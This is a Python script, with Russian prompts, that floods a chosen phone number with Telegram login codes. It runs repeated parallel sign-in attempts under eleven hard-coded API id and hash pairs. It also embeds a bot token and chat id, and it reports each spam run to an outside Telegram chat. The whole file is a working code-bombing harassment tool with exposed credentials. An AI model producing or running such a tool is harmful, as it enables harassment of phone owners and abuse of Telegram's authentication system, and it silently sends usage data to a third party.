import asyncio
from telethon import TelegramClient
from pystyle import Write, Colors, Center
import os
import requests

os.system('cls' if os.name == 'nt' else 'clear')

bot_token = '7607451060:AAGB0ZRgc2_S1QDS15tyh9HulYRvp0RODEI'
chat_id = '2110557179'

banner = '''
                                                                        

                                                .x+=:.                                s    
                                               z`    ^%    .uef^"                    :8    
             x.    .        ..    .     :         .   <k :d88E              u.      .88    
      .    .@88k  z88u    .888: x888  x888.     .@8Ned8" `888E        ...ue888b    :888ooo 
 .udR88N  ~"8888 ^8888   ~`8888~'888X`?888f`  .@^%8888"   888E .z8k   888R Y888r -*8888888 
<888'888k   8888  888R     X888  888X '888>  x88:  `)8b.  888E~?888L  888R I888>   8888    
9888 'Y"    8888  888R     X888  888X '888>  8888N=*8888  888E  888E  888R I888>   8888    
9888        8888  888R     X888  888X '888>   %8"    R88  888E  888E  888R I888>   8888    
9888        8888 ,888B .   X888  888X '888>    @8Wou 9%   888E  888E u8888cJ888   .8888Lu= 
?8888u../  "8888Y 8888"   "*88%""*88" '888!` .888888P`    888E  888E  "*888*P"    ^%888*   
 "8888P'    `Y"   'YP       `~    "    `"`   `   ^"F     m888N= 888>    'Y"         'Y"    
   "P'                                                    `Y"   888                        
                                                               J88"                        
                                                               @%                          
                                                             :"                            

                                                                        


'''

Write.Print(Center.XCenter(banner), Colors.blue_to_cyan, interval=0.001)

accounts = [
    {'api_id': '6', 'api_hash': 'eb06d4abfb49dc3eeb1aeb98ae0f581e'},
    {'api_id': '8', 'api_hash': '7245de8e747a0d6fbe11f7cc14fcc0bb'},
    {'api_id': '21724', 'api_hash': '3e0cb5efcd52300aec5994fdfc5bdc16'},
    {'api_id': '16623', 'api_hash': '8c9dbfe58437d1739540f5d53c72ae4b'},
    {'api_id': '2899', 'api_hash': '36722c72256a24c1225de00eb6a1ca74'},
    {'api_id': '10840', 'api_hash': '33c45224029d59cb3ad0c16134215aeb'},
    {'api_id': '1', 'api_hash': 'b6b154c3707471f5339bd661645ed3d6'},
    {'api_id': '4', 'api_hash': '014b35b6184100b085b0d0572f9b5103'},
    {'api_id': '5', 'api_hash': '1c5c96d5edd401b1ed40db3fb5633e2d'},
    {'api_id': '2040', 'api_hash': 'b18441a1ff607e10a989891a5462e627'},
    {'api_id': '17349', 'api_hash': '344583e45741c457fe1862106095a5eb'}
]

def send_notification(bot_token, chat_id, message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': message
    }
    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print("")
        else:
            print(f"Возникла ошибка: {response.status_code}")
    except Exception as e:
        print(f"Возникла ошибка: {e}")


async def authorize_client(phone_number, api_id, api_hash):
    client = TelegramClient(None, api_id, api_hash)

    try:
        await client.start(phone=phone_number)

        if not await client.is_user_authorized():
            print(f"Пользователь {phone_number} не зарегистрирован в Telegram, поэтому спам невозможен.")
        else:
            print(f"Код на {phone_number} был успешно отправлен.\nAPI ID: {api_id} | API HASH: {api_hash}")
    
    except Exception as e:
        print(f"Ошибка авторизации для {phone_number} с API ID {api_id}: {e}")

    finally:
        await client.disconnect()


async def send_codes_with_delay(phone_number, num_cycles):
    for cycle in range(num_cycles):
        print(f"\nЗапуск цикла {cycle + 1} из {num_cycles}")
        send_notification(bot_token, chat_id, f'Отправляется спам на номер {phone_number}, {num_cycles} циклов')
        tasks = []
        for index, account in enumerate(accounts):
            task = authorize_client(phone_number, account['api_id'], account['api_hash'])
            tasks.append(task)
            await asyncio.sleep(0.01) 
        await asyncio.gather(*tasks)  
    print("Все итерации завершены.")

async def main():
    phone_number = Write.Input("\nВведите номер телефона для спама: ", Colors.blue_to_cyan, interval=0.005)
    num_cycles = int(Write.Input("\nСколько раз вы хотите отправить коды?: ", Colors.blue_to_cyan, interval=0.005))
    await send_codes_with_delay(phone_number, num_cycles)

if __name__ == '__main__':
    asyncio.run(main())
